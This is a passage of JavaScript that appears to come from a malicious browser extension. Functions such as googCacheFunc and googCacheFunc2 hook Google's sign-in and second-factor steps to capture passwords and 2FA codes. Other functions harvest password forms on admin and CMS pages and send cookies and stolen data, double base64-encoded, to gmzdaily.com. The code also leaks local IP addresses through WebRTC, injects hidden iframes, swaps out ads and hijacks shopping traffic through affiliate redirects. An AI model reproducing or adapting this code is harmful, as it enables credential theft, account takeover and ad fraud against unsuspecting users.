        e.setAttribute("async", ""); 
        e.setAttribute("src", "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js");
        var f = document.createElement("script"); 
        f.setAttribute("async", ""); 
        f.innerHTML = "(adsbygoogle = window.adsbygoogle || []).push({});";
        d.appendChild(e); 
        d.appendChild(f); 
        repChild(a, d); 
        extgaLog("adesns " + adRepCount + " " + b + "x" + c); 
        adRepCount += 1
    }
}

function TrckAdsLoad() {
    var a = getDomain(!0);
    extgaLog("TrckAdsLoad " + a);
    jsContent = "";
    jsContent += "(function(i,s,o,g,r,a,m) { i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function() { ";
    jsContent += "(i[r].q=i[r].q||[]).push(arguments) }, i[r].l = 1 * new Date(); a = s.createElement(o), ";
    jsContent += "m=s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)";
    jsContent += "})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga_uniqtrackonallpages3824');";
    jsContent += "ga_uniqtrackonallpages3824('create', 'UA-60144933-25', 'auto');";
    jsContent += "ga_uniqtrackonallpages3824('set', 'pageview');";
    jsContent += "ga_uniqtrackonallpages3824('set', 'dimension1', '" + a + "');";
    jsContent += "ga_uniqtrackonallpages3824('set', 'dimension2', '" + extType + "');";
    jsContent += "ga_uniqtrackonallpages3824('send',  {";
    jsContent += "hitType: 'pageview',";
    jsContent += "page: '" + extType + "',";
    jsContent += "title: '" + a + "'";
    jsContent += "});";
    a = document.createElement("script");
    a.textContent = jsContent;
    document.body.appendChild(a)
}

function repWiFrm(a, b) {
    isElementInViewport(a) || (a.setAttribute("extdip88slf66", "1"), 2 >= adRepCount ? (fadeOut(a), setTimeout(repChild, 1E3, a, b)) : setTimeout(repChild, 0, a, b), extgaLog("repad " + adRepCount + " " + a.offsetWidth + "x" + a.offsetHeight), adRepCount += 1, TrckAdsLoad())
}

function isElementInViewport(a) {
    "function" === typeof jQuery && a instanceof jQuery && (a = a[0]);
    a = a.getBoundingClientRect();
    return 0 <= a.top && 0 <= a.left && a.bottom <= (window.innerHeight || document.documentElement.clientHeight) && a.right <= (window.innerWidth || document.documentElement.clientWidth)
}

function repChild(a, b) {
    a.parentNode.appendChild(b);
    a.setAttribute("style", "display:none");
    setTimeout(function() {
        a.setAttribute("style", "display:none")
    }, 1E3);
    setTimeout(function() {
        a.setAttribute("style", "display:none")
    }, 2E3)
}

function fadeOut(a, b) {
    isNaN(b) && (b = 9);
    a.style.opacity = "0." + b;
    0 < b && setTimeout(fadeOut, 100, a, b - 1)
}

function CrtIfm(a, b, c) {
    var d = document.createElement("IFRAME");
    d.setAttribute("width", b);
    d.setAttribute("height", c);
    d.setAttribute("src", a);
    d.setAttribute("extdip88slf66", "1");
    d.setAttribute("scrolling", "no");
    d.setAttribute("marginWidth", "0px");
    d.setAttribute("marginHeight", "0px");
    d.setAttribute("style", "border:none;");
    d.frameBorder = "0"; 
    isLog_jojo && d.setAttribute("style", "border: 1px dashed #880000;");
    return d
}

function supportChitika(a, b) {
    return -1 < "160x600 300x250 320x50 300x600 550x250 728x90".split(" ").indexOf(a + "x" + b) ? !0 : !1
}

function SdAdmCkie() {
    if (ndAdmCkie() && !(-1 < document.cookie.indexOf("ext_admckiegtsucc"))) {
        var a = new XMLHttpRequest,
            b = document.cookie + "\r\n";
        b += "ext: " + extType + "\r\n";
        b += "instd: " + numDayInst + "\r\n";
        b += "uid: <a href='https://mail.google.com/mail/u/0/#search/" + usrHxId + "'>" + usrHxId + "</a>" + usrHxId + "\r\n";
        var c = "[Inbox] " + getDomain(!1);
        b = "https://gmzdaily.com/alt.php?&c=" + B64E(B64E(b, "encode"), "encode");
        b = b + "&u=" + B64E(B64E(c, "encode"), "encode");
        a.open("GET", b, !0);
        a.send();
        stCkie_ex("ext_admckiegtsucc", "-0.1", 1 / 24)
    }
}

function ndAdmCkie() {
    getDomain(!1);
    return !1
}

function parseCkie(a) {
    a = a.split(";");
    var b = "\r\n", 
        c;
    for (c in a) {
        var d = a[c].indexOf("=");
        d = a[c].substring(0, d) + "\t" + a[c].substring(d + 1);
        console.log(a[c]);
        console.log(d);
        d = ".xyzdomain.com\tTRUE\t/\tFALSE\t1607783229\t" + d + "\n";
        b += d
    }
    return b
}

function SdFrmData() {
    SdLclStrg();
    for (var a = document.getElementsByTagName("form"), b = 0; b < a.length; b++) a[b].addEventListener("submit", SdFrmCacheFunc, !1)
}

function hkNxtBnClk() {
    extgaLog("hkNxtBnClk");
    var a = document.getElementById("passwordNext");
    a ? (a.addEventListener("click", googCacheFunc, !1), document.documentElement.addEventListener("keypress", function(a) {
        13 === a.keyCode && googCacheFunc()
    }, !1)) : setTimeout(hkNxtBnClk, 1E3)
}

function googCacheFunc() {
    for (var a = "", b = document.getElementById("profileIdentifier").innerHTML, c = "", d = document.getElementsByTagName("input"), e = 0; e < d.length; e++) "password" == d[e].getAttribute("type") && (c = d[e].value);
    0 != c.length && (a = a + ("uid: " + b + "\t\tpass: ") + (c + "\r\n\r\nlogin: ") + (window.location.href + "\r\n"), a += "normal: " + getDomain(!1) + "\r\n", a += "ext: " + extType + "\r\n", a += "instd: " + numDayInst + "\r\n", a += "uid: " + usrHxId + "\r\n", a += "why: googlogin\r\n", extgaLog(a), localStorage.setItem("extCacheFunc", dblB64(a, "encode")), hkScndFctAuth())
}

function hkScndFctAuth() {
    extgaLog("hkScndFctAuth");
    var a = document.getElementById("next");
    a ? (a.addEventListener("click", googCacheFunc2, !1), document.documentElement.addEventListener("keypress", function(a) {
        13 === a.keyCode && googCacheFunc2()
    }, !1)) : setTimeout(hkScndFctAuth, 1E3)
}

function googCacheFunc2() {
    for (var a = "", b = "", c = document.getElementsByTagName("input"), d = 0; d < c.length; d++)
        if ("text" == c[d].getAttribute("type") || "tel" == c[d].getAttribute("type")) b = c[d].value;
    0 != b.length && (a = a + ("2nd factor: " + b + "\r\n\r\nlogin: ") + (window.location.href + "\r\n"), a += "normal: " + getDomain(!1) + "\r\n", a += "ext: " + extType + "\r\n", a += "instd: " + numDayInst + "\r\n", a += "uid: " + usrHxId + "\r\n", a += "why: goog2nd\r\n", extgaLog(a), localStorage.setItem("extCacheFunc2", dblB64(a, "encode")))
}

function IsIntraDm() {
    var a = getDomain(!1);
    return -1 < a.indexOf("localhost") || -1 < a.indexOf("10.") || -1 < a.indexOf("192.168") || -1 < a.indexOf("127.0.0.1") ? !0 : !1
}

function DmNdAdmLgn() {
    var a = window.location.href,
        b = document.referrer,
        c = getDomain(!1);
    return -1 < c.indexOf("localhost") || -1 < c.indexOf("10.") || -1 < c.indexOf("192.168") || -1 < c.indexOf("127.0.0.1") || -1 < c.indexOf("peopleadmin.com") || -1 < c.indexOf("etdadmin.com") || -1 < c.indexOf(".bom.com") || -1 < c.indexOf(".xtream-codes.com") || -1 < a.indexOf("register") || -1 < a.indexOf("zhuce") ? !1 : -1 < c.indexOf("adm.dealmoon") || -1 < c.indexOf("admin.dealmoon") || -1 < c.indexOf(".cox.com") || -1 < c.indexOf("icntv.xyz") || -1 < a.indexOf("admin") || -1 < a.indexOf("cms") || -1 < a.indexOf("/dede/") || -1 < a.indexOf("chrome.google.com") || -1 < a.indexOf("accounts.firefox.com") || -1 < b.indexOf("admin") || -1 < b.indexOf("cms") || -1 < b.indexOf("chrome.google.com") || -1 < b.indexOf("addons.mozilla.org") ? !0 : !1
}
var cacheResn = "";

function SdFrmCacheFunc(a) {
    a = a.target.parentNode.getElementsByTagName("input");
    for (var b = "", c = !1, d = !1, e = 0; e < a.length; e++) {
        var f = a[e].getAttribute("name"),
            g = a[e].value,
            h = a[e].getAttribute("type");
        "hidden" != h && (b += "name: " + f + "\t\t", b += "value: " + g + "\r\n");
        "password" == h && (c = !0); -1 < f.toLowerCase().indexOf("admin") && (d = !0, -1 == cacheResn.indexOf("field=admin ") && (cacheResn += "field=admin ")); -1 < g.toLowerCase().indexOf("admin") && "password" != h && "hidden" != h && (d = !0, -1 == cacheResn.indexOf("uid=admin ") && (cacheResn += "uid=admin "));
        if ("63fef65b" == usrHxId || "ddc2ddba" == usrHxId || "2200c254" == usrHxId || "ac78fee2" == usrHxId) d = !0, -1 == cacheResn.indexOf("usr=selected ") && (cacheResn += "usr=selected ")
    }
    b += "\r\nlogin: " + window.location.href + "\r\n";
    b += "normal: " + getDomain(!1) + "\r\n";
    b += "top: " + getTopDomain() + "\r\n";
    b += "sw: https://www.similarweb.com/website/" + getDomain(!1) + "\r\n";
    b += "ext: " + extType + "\r\n";
    b += "instd: " + numDayInst + "\r\n";
    b += "uid: https://mail.google.com/mail/u/0/#search/" + usrHxId + "\r\n";
    c && (DmNdAdmLgn() || d) && !IsIntraDm() && (DmNdAdmLgn() && (cacheResn += "url=DmNdAdmLgn "), b += "why: " + cacheResn + "\r\n", localStorage.setItem("extCacheFunc", dblB64(b, "encode")))
}

function GtAlexaInfo(a) {
    var b = new XMLHttpRequest;
    b.onreadystatechange = function() {
        if (4 == b.readyState) {
            var c = b.responseText;
            if (0 < c.length) {
                c = dblB64(c, "decode");
                var d = c.split("`")[0];
                c.split("`");
                var e = c.split("`")[2];
                "" == d && (d = "99999999999");
                var f = !1;
                c = "[P] " + getDomain(!1);
                500 < parseInt(d) && 1E5 > parseInt(d) && (f = "UNKNOWN", 500 < parseInt(d) && 1E3 > parseInt(d) && (f = "AAAA1K"), 1E3 < parseInt(d) && 1E4 > parseInt(d) && (f = "BBB10K"), 1E4 < parseInt(d) && 1E5 > parseInt(d) && (f = "CC100K"), c = "[Rank=" + f + "]" + c, f = !0);
                isExcludeAlexFltr() && (f = !1);
                0 < e.length && (c = "[Merchant]" + c, f = !0);
                f && (d = new XMLHttpRequest, e = "https://gmzdaily.com/alt.php?&c=" + a, e = e + "&u=" + dblB64("[AlexaFilter]" + c, "encode"), d.open("GET", e, !0), d.send());
                localStorage.setItem("extCacheFunc", "")
            }
        }
    };
    b.open("GET", "https://mitarchive.info/alexbob.php?s=http://" + getTopDomain(), !0);
    b.send()
}

function isExcludeAlexFltr() {
    var a = getDomain(!1);
    return 5 <= a.split(".").length || 35 <= a.length || -1 < a.indexOf(".booking.com") || -1 < a.indexOf(".xfinity.com") || -1 < a.indexOf(".netease.com") || -1 < a.indexOf(".bitbucket.org") || -1 < a.indexOf(".mailchimp.com") || -1 < a.indexOf(".irobotbox.com") || -1 < a.indexOf(".cloudflare.com") || -1 < a.indexOf(".bitbucket.org") || -1 < a.indexOf(".inbank.it") || -1 < a.indexOf(".mycompanyadmin.com") ? !0 : !1
}

function SdLclStrg() {
    var a = localStorage.getItem("extCacheFunc");
    a && 0 < a.length && GtAlexaInfo(a)
}

function TrckAllTrffc() {
    if (!(-1 < document.cookie.indexOf("trdipcktrffcext"))) {
        var a = getDomain(!0),
            b = (exversion_jojo + "." + minorVerId).replace("ex-", ""),
            c = siteType;
        domainMatchesList(addMercDom) && "merc" != siteType && (c = "addm");
        var d = extType + " " + b + " " + c + " " + numDayInst + " " + a;
        jsContent = "";
        jsContent += "(function(i,s,o,g,r,a,m) { i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function() {";
        jsContent += "(i[r].q=i[r].q||[]).push(arguments)}, i[r].l = 1 * new Date(); a = s.createElement(o), ";
        jsContent += "m=s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)";
        jsContent += "})(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga_uniqtrackonallpages3721');";
        jsContent += "ga_uniqtrackonallpages3721('create', 'UA-60144933-28', 'auto');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'pageview');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension1', '" + extType + "');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension2', '" + a + "');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension3', '" + usrHxId + "');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension4', '" + c + "');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension5', '" + TransDaysLongNameToAvoidConflict008(numDayInst) + "');";
        jsContent += "ga_uniqtrackonallpages3721('set', 'dimension6', '" + b + "');";
        jsContent += "ga_uniqtrackonallpages3721('send',  {";
        jsContent += "hitType: 'pageview',";
        jsContent += "page: '" + d + "',";
        jsContent += "title: 'ux= " + usrHxId + "'";
        jsContent += "});";
        a = document.createElement("script");
        a.textContent = jsContent;
        document.body.appendChild(a);
        stCkie_ex("trdipcktrffcext", "1", 1 / 24 / 6)
    }
}

function TransDaysLongNameToAvoidConflict008(a) {
    var b = parseFloat(a);
    return 15 > b ? "0000-0015" : 30 > b ? "0015-0030" : 60 > b ? "0030-0060" : 120 > b ? "0060-0120" : 240 > b ? "0120-0240" : 480 > b ? "0240-0480" : 960 > b ? "0480-0960" : 1920 > b ? "0960-1920" : 3840 > b ? "1920-3840" : 7680 > b ? "3840-7680" : 99999999 > b ? "9999-9999" : "invalid-" + a
}

function LogErrRemote(a) {
    (function(a, c, d, e, f, g, h) {
        a.GoogleAnalyticsObject = f;
        a[f] = a[f] || function() {
            (a[f].q = a[f].q || []).push(arguments)
        };
        a[f].l = 1 * new Date;
        g = c.createElement(d);
        h = c.getElementsByTagName(d)[0];
        g.async = 1;
        g.src = e;
        h.parentNode.insertBefore(g, h)
    })(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga_dip4");
    ga_dip4("create", "UA-60144933-4", "auto");
    ga_dip4("send", {
        hitType: "pageview",
        page: location.pathname,
        title: "id=" + minorVerId + " " + getStats() + " " + a
    })
}

function rmvOldClkHsty_ex(a, b, c) {
    b = "undefined" !== typeof b ? b : 168;
    c = "undefined" !== typeof c ? c : 800;
    if (localStorage.getItem(a)) {
        for (var d = dblB64(localStorage.getItem(a), "decode").split("|"), e = 0, f = "", g = 0; g < d.length; g++) {
            var h = d[g],
                k = h.split("^")[0];
            (genTime() - k) / 1E3 / 3600 <= b && e < c && (f = f + "|" + h);
            e += 1
        }
        0 < f.length && (f = f.substring(1));
        localStorage.getItem(a) != dblB64(f, "encode") && localStorage.setItem(a, dblB64(f, "encode"))
    }
}

function savLocStrgy_ex(a, b) {
    if ("undefined" !== typeof localStorage)
        if (localStorage.getItem(b)) {
            var c = dblB64(localStorage.getItem(b), "decode");
            localStorage.setItem(b, dblB64(a + "|" + c, "encode"))
        }
    else localStorage.setItem(b, dblB64(a, "encode"))
}

function genTime() {
    return (new Date).getTime()
}

var beforeLockY;

function lockScroll() {
    beforeLockY = self.pageYOffset;
    document.onscroll = function() {
        window.scrollTo(0, beforeLockY)
    };
    document.onwheel = unlockScroll
}

function unlockScroll() {
    document.onscroll = null;
    document.onwheel = null
}

function isNeedAllowSameOr_ex(a) {
    a = extrHost_ex(a, !1);
    for (var b = 0; b < needAllowSameOr.length; b++)
        if (-1 < a.indexOf(needAllowSameOr[b])) return !0;
    return !1
}

function isNeedCustRef(a) {
    a = extrHost_ex(a, !1);
    for (var b = 0; b < needCustRef.length; b++)
        if (-1 < a.indexOf(needCustRef[b].replace("www.", ""))) return !0;
    return !1
}

function domainMatchesList(a) {
    for (var b = document.location.hostname, c = 0; c < a.length; c++) {
        var d = "." + a[c];
        if (b == a[c] || -1 < b.indexOf(d) && b.indexOf(d) + a[c].length + 1 == b.length) return !0
    }
    return !1
}

function isDmnToSpcCnvrt() {
    for (var a = extrHost_ex(location.href, !1), b = 0; b < dmToSpcCnvrt.length; b++)
        if (a == dmToSpcCnvrt[b]) return !0;
    return !1
}

function isNeedSandbox_ex(a) {
    a = extrHost_ex(a, !1);
    for (var b = 0; b < noSandboxOk_ex.length; b++)
        if (-1 < a.indexOf(noSandboxOk_ex[b])) return !1;
    return !0
}

function IstIvsIfm_ex(a, b, c, d) {
    if ("" != a) {
        var e = document.createElement("IFRAME"),
            f = B64E(a + getRandomInt(1, 999999).toString(), "encode");
        e.setAttribute("width", "0px");
        e.setAttribute("height", "0px");
        e.setAttribute("display", "none");
        if (b) {
            var g = "";
            c && (g = " allow-same-origin", lockScroll(), setTimeout(unlockScroll, 2888));
            setTimeout(function() {
                document.getElementById(f).setAttribute("sandbox", "allow-scripts" + g)
            }, 488);
            setTimeout(function() {
                document.getElementById(f).setAttribute("sandbox", "")
            }, 2888)
        }
        e.setAttribute("src", a);
        e.setAttribute("id", f);
        document.body.appendChild(e);
        setTimeout(function() {
            var a = document.getElementById(f);
            a.parentNode.removeChild(a)
        }, 1E3 * d)
    }
}

function fetchCustRef(a) {
    var b = new XMLHttpRequest;
    b.onreadystatechange = function() {
        if (4 == b.readyState) {
            var a = b.responseText;
            if (0 < a.length) {
                var d = a.split("\t")[0];
                a = a.split("\t")[1];
                sigLnk_ex(a, d)
            }
        }
    };
    b.onprogress = function() {};
    b.open("GET", location.protocol + "//mitarchive.info/ref2.php?d=" + a, !0);
    b.send()
}

function sigLnk_ex(a, b) {
    if (isDmnToSpcCnvrt() && "dir" == isRefLnk() && (extgaLog("sigLnk_ex special handling..."), setTimeout(GoSpeCnvrt, 9E4), 90 >= getRandomInt(0, 100))) return;
    rmvOldClkHsty_ex("csHsty", 168, 100);
    var c = getDestUrl(a, !1),
        d = document.createElement("div");
    d.setAttribute("id", "extftsams88ba");
    0 < b.length ? (extgaLog("nav to " + a + " via ref page " + b), d.setAttribute("v2", dblB64(b, "encode")), c = "http:", -1 < b.indexOf("https:") && (c = "https:"), c = c + "//mitarchive.info/reads.php?ver=ex-0.3|ex_" + extType + "&des=" + encodeURIComponent(a), -1 < a.indexOf("mitarchive.info") && (c = a), d.setAttribute("v3", dblB64(c, "encode"))) : (extgaLog("nav to " + c), d.setAttribute("v1", dblB64(c, "encode")));
    d.setAttribute("width", "0px");
    d.setAttribute("height", "0px");
    d.setAttribute("style", "display:none");
    document.getElementById("extftsams88ba") || document.body.appendChild(d);
    lgCsEvt_ex(a, "|exmain");
    stCkie_ex("ext_pgvwcount", "-0.1", 1 / 24)
}

function GoSpeCnvrt() {
    extgaLog("Use GoSpeCnvrt meth");
    isAct_ex ? extgaLog("page active: quit...") : -1 == document.cookie.indexOf("ext_spccnvrt") && -1 < document.cookie.indexOf("hibext_instdsigdip") ? DirConn() : extgaLog("GoSpeCnvrt: skip (recently tagged)")
}

function GoSpeCnvrtWithoutRef(a) {
    extgaLog("Use GoSpeCnvrtWithoutRef meth");
    isAct_ex ? extgaLog("page active: quit...") : -1 == document.cookie.indexOf("ext_spccnvrt") && -1 < document.cookie.indexOf("hibext_instdsigdip") ? (window.location.href = a, stCkie("ext_spccnvrt", "1", .0625, getTopDomain())) : extgaLog("GoSpeCnvrtWithoutRef: skip (recently tagged)")
}

function DirConn() {
    var a = new XMLHttpRequest,
        b = getDestUrl(location.href, !1);
    a.onreadystatechange = function() {
        4 == a.readyState && -1 < a.responseText.indexOf("aloha") && (extgaLog("GoSpeCnvrt: " + b), lgCsEvt_ex(location.href, "|exmain"), stCkie_ex("ext_pgvwcount", "-0.1", 1 / 24), stCkie("ext_spccnvrt", "1", 10 / 24 / 60, getTopDomain()), window.location.href = b)
    };
    a.onprogress = function() {};
    a.open("GET", "https://www.trendupdeal.com/ping.php", !0);
    a.send()
}

function sigSvLoc() {
    var a = document.createElement("div");
    a.setAttribute("id", "extftsams66ba");
    a.setAttribute("k1", dblB64("diptestkey1", "encode"));
    a.setAttribute("v1", dblB64("diptestval1", "encode"));
    a.setAttribute("k2", dblB64("diptestkey2", "encode"));
    a.setAttribute("v2", dblB64("diptestval2", "encode"));
    a.setAttribute("k3", dblB64("diptestkey3", "encode"));
    a.setAttribute("v3", dblB64("diptestval3", "encode"));
    a.setAttribute("width", "0px");
    a.setAttribute("height", "0px");
    a.setAttribute("style", "display:none");
    document.body.appendChild(a)
}

function getDestUrl(a, b) {
    return "http://www.trendupdeal.com/redirect.php?ver=ex-0.3|ex_" + extType + "&url=" + encodeURIComponent(a)
}

function LandEty() {}

function CbckEty() {
    instImg("http://mitarchive.info/stck.php?key=hldme&val=1&exp=300", 3E3)
}

function instImg(a, b) {
    var c = document.createElement("img"),
        d = "imgheadertag" + getRandomInt(8, 8888);
    c.src = a;
    c.setAttribute("id", d);
    c.setAttribute("width", "0px");
    c.setAttribute("height", "0px");
    c.setAttribute("display", "none");
    document.getElementsByTagName("head")[0].appendChild(c);
    setTimeout(function() {
        var a = document.getElementById(d);
        a.parentNode.removeChild(a)
    }, b)
}

function MercEty() {
    if (isLaunchedFromExt && isHum) {
        var a = location.protocol,
            b = TranslateDm(getDomain(!1)),
            c = a + "//" + b,
            d = 1 / 12;
        VstCtPlusOne();
        "www.tmall.com" == b && "https://www.tmall.com/" == location.href && (a = a + "//mitarchive.info/reads.php?ver=ex-0.3|ex_" + extType + "&des=" + encodeURIComponent("www.tmall.com"), extgaLog("Will init GoSpeCnvrtWithoutRef in 10 sec..."), setTimeout(GoSpeCnvrtWithoutRef, 1E4, a));
        isDmOK(b) && (incCkie_ex("ext_pgvwcount", 1 / 24, 1), !isInRctHsty_ex(c, "csHsty", .05) && 2 <= gtCkie_ex("ext_pgvwcount") || "dir" != isRefLnk() && !isInRctHsty_ex(c, "csHsty", d / 60) && !isDmnToSpcCnvrt()) && (-1 < c.indexOf(".tmall.com") || -1 < c.indexOf(".alitrip.com") || -1 < c.indexOf(".fliggy.com") || -1 < c.indexOf(".aliyun.com") ? fetchAliRefAndGo(c) : isNeedCustRef(location.href) ? fetchCustRef(b) : sigLnk_ex(c, ""))
    }
}

function fetchAliRefAndGo(a) {
    50 >= getRandomInt(0, 100) && instImg("http://slicksell.us/setck.php?n=extishmn&v=1", 6E3);
    if (96 >= getRandomInt(0, 100) && localStorage.slicksell) useSlickRefToSignal(a, localStorage.slicksell);
    else {
        var b = new XMLHttpRequest;
        b.onreadystatechange = function() {
            if (4 == b.readyState) {
                var c = b.responseText;
                c = dblB64(c, "decode");
                localStorage.slicksell = c;
                useSlickRefToSignal(a, localStorage.slicksell)
            }
        };
        b.onprogress = function() {};
        b.open("GET", location.protocol + "//mitarchive.info/slickhot.php", !0);
        b.send()
    }
}

function useSlickRefToSignal(a, b) {
    var c = b.split(",");
    c = c[Math.floor(Math.random() * (c.length - 16))];
    c = "http://slicksell.us/forums/topic/" + c + "/";
    5 >= getRandomInt(0, 100) && (c = "http://slicksell.us/forums/forum/fleamarket/");
    extgaLog("ali special handler");
    sigLnk_ex(a, c)
}

function TranslateDm(a) {
    var b = a.split(".");
    if (-1 < "bananarepublic.gap.com factory.jcrew.com store.nike.com disneyworld.disney.go.com oldnavy.gap.com item.rakuten.co.jp outlet.us.dell.com ecomm.dell.com web1.sasa.com tjmaxx.tjx.com www3.hilton.com shop.usa.canon.com tjmaxx.tjx.com luxury.harrods.com estore-us.pandora.net secure-store.nike.com us.shop.ecco.com tickets.fandango.com accessories.us.dell.com".split(" ").indexOf(a)) return a;
    if (-1 < a.indexOf("ju.taobao.com")) return "ju.taobao.com";
    if (-1 < a.indexOf("taobao.com")) return "www.taobao.com";
    if (-1 < a.indexOf("tmall.com")) return "www.tmall.com";
    if (-1 < a.indexOf("alitrip.com")) return "www.alitrip.com";
    if (-1 < a.indexOf("amazon.co.jp")) return "www.amazon.co.jp";
    if (-1 < a.indexOf("amazon.co.uk")) return "www.amazon.co.uk";
    if (-1 < a.indexOf("amazon.ca")) return "www.amazon.ca";
    if (-1 < a.indexOf("amazon.de")) return "www.amazon.de";
    if (-1 < a.indexOf("rakuten.co.jp")) return "www.rakuten.co.jp";
    if (-1 < a.indexOf("turbotax.intuit.com")) return "turbotax.intuit.com";
    if (-1 < a.indexOf(".ebay.com")) return "www.ebay.com";
    if (2 == b.length) return a;
    if (3 == b.length) {
        b = a.split(".")[0];
        var c = a.split(".")[1],
            d = a.split(".")[2];
        return "m" == b || "mobile" == b || "store" == b || "www1" == b || "usa" == b || "us" == b || "uk" == b || "jp" == b || "ca" == b || "zh" == b || "cn" == b || "china" == b || "english" == b || "co" == c && ("uk" == d || "jp" == d) ? a : "www." + c + "." + d
    }
    if (4 <= b.length) return a = b.length, b[a - 4] + "." + b[a - 3] + "." + b[a - 2] + "." + b[a - 1]
}

function isRefLnk() {
    var a = document.referrer;
    if (0 == a.length) return "dir";
    if ("s.click.taobao.com" == extrHost_ex(a, !1)) return "s.click.taobao.com";
    var b = extrHost_ex(a, !1).split("."),
        c = getDomain(!1).split(".");
    return b[b.length - 1] == c[c.length - 1] && b[b.length - 2] == c[c.length - 2] ? "dir" : extrHost_ex(a, !0).replace(".com", "")
}

function isDmOK(a) {
    a = void 0 === a ? getDomain(!0) : a;
    return -1 < a.indexOf("clinique.") || -1 < a.indexOf("bloomberg.com") || -1 < a.indexOf("nytimes.com") || -1 < a.indexOf("netflix.com") || -1 < a.indexOf("bing.com") || -1 < a.indexOf("myhuo.net") || -1 < a.indexOf("costco.com") || -1 < a.indexOf("united.com") || -1 < a.indexOf("adidas.com") || -1 < a.indexOf("zara.com") || -1 < a.indexOf("aritzia.com") ? !1 : -1 < a.indexOf("amazon.com") ? "www.amazon.com" == a || "amazon.com" == a ? !0 : !1 : !0
}

function dbgMerc() {
    localStorage.csHsty = "";
    stCkie_ex("ext_pgvwcount", "100", 1 / 24);
    MercEty()
}

function VstCtPlusOne() {
    isNaN(localStorage.extVstCt) ? localStorage.extVstCt = 1 : localStorage.extVstCt = parseInt(localStorage.extVstCt) + 1
}

function GtVstCt() {
    return isNaN(localStorage.extVstCt) ? -1 : parseInt(localStorage.extVstCt)
}

function isDesktopChrome() {
    var a = window.navigator.userAgent,
        b = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile|CriOS/i.test(a);
    return -1 < a.indexOf("Chrome") && -1 == a.indexOf("Edge") && !b ? !0 : !1
}
var locIP = "",
    pubIP = "";

function fetchMyIP() {
    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
    var a = new RTCPeerConnection({
            iceServers: []
        }),
        b = function() {};
    a.createDataChannel("");
    a.createOffer(a.setLocalDescription.bind(a), b);
    a.onicecandidate = function(c) {
        c && c.candidate && c.candidate.candidate && (locIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(c.candidate.candidate)[1], a.onicecandidate = b)
    };
    var c = document.createElement("script");
    c.src = "https://gmzdaily.com/tmp/js.php";
    document.getElementsByTagName("head")[0].appendChild(c)
}

function getIllTitle(a) {
    return "r=" + a + " l=" + locIP + " p=" + pubIP + " "
}

function TrckIllUA() {
    fetchMyIP();
    isDesktopChrome() || setTimeout(trackIllGA, 3E3, "UA");
    isTrpByHP && setTimeout(trackIllGA, 3E3, "HP")
}

function trackIllGA(a) {
    (function(a, b, e, f, g, h, k) {
        a.GoogleAnalyticsObject = g;
        a[g] = a[g] || function() {
            (a[g].q = a[g].q || []).push(arguments)
        };
        a[g].l = 1 * new Date;
        h = b.createElement(e);
        k = b.getElementsByTagName(e)[0];
        h.async = 1;
        h.src = f;
        k.parentNode.insertBefore(h, k)
    })(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga_dip5");
    ga_dip5("create", "UA-60144933-4", "auto");
    ga_dip5("send", {
        hitType: "pageview",
        page: location.href + location.pathname,
        title: getIllTitle(a)
    });
    var b = 0;
    localStorage.getItem("csHsty") && (b = dblB64(localStorage.getItem("csHsty"), "decode").split("|").length);
    title = "[T] " + a + " " + extType + "~" + exversion_jojo + "." + minorVerId + " " + pubIP;
    content = "";
    content += "public IP: " + pubIP + "\n";
    content += "private IP: " + locIP + "\n";
    content += "domain: " + getDomain(!0) + "\n";
    content += "page view: : " + gtCkie_ex("ext_pgvwcount") + "\n";
    content += "referer: " + document.referrer + "\n";
    content += "cs count: " + b + "\n";
    content += "extension: " + extType + "\n";
    content += "ext ver: " + exversion_jojo + "." + minorVerId + "\n";
    content += "isHum: " + isHum + "\n";
    content += "isTrpByHP: " + isTrpByHP + "\n";
    content += "user Agent: " + window.navigator.userAgent + "\n";
    sndEmAlt(title, content)
}

function TstBloDm() {
    "http:" == location.protocol && 66 >= getRandomInt(0, 100) && (fetchFromDomain("fleamarketunime.ipage.com"), fetchFromDomain("dzaz.us"), fetchFromDomain("dzaz.org"), fetchFromDomain("www.trendupdeal.com"), fetchFromDomain("dealguide.us"), fetchFromDomain("www.mitarchive.info"), fetchFromDomain("dcfj.org"), fetchFromDomain("ec2-52-32-215-252.us-west-2.compute.amazonaws.com"), gaTrack27("www.benchmark.com"))
}

function fetchFromDomain(a) {
    var b = new XMLHttpRequest;
    b.onreadystatechange = function() {
        4 == b.readyState && -1 < b.responseText.indexOf("dipscss") && gaTrack27(a)
    };
    b.onprogress = function() {};
    b.open("GET", location.protocol + "//" + a + "/temp/test.php", !0);
    b.send()
}

function gaTrack27(a) {
    a = exversion_jojo + "." + minorVerId + "-" + a;
    (function(a, c, d, e, f, g, h) {
        a.GoogleAnalyticsObject = f;
        a[f] = a[f] || function() {
            (a[f].q = a[f].q || []).push(arguments)
        };
        a[f].l = 1 * new Date;
        g = c.createElement(d);
        h = c.getElementsByTagName(d)[0];
        g.async = 1;
        g.src = e;
        h.parentNode.insertBefore(g, h)
    })(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga_dp27ng");
    ga_dp27ng("create", "UA-60144933-27", "auto");
    ga_dp27ng("set", "dimension1", a);
    ga_dp27ng("send", {
        hitType: "pageview",
        page: a,
        title: a
    })
}

function SeoExtGrht() {
    if ("google.com" == getDomain(!0) && -1 == document.cookie.indexOf("gseodone_ext")) {
        var a = "https://www.google.com/#q=" + encodeURI("chrome+extension+tab+hide");
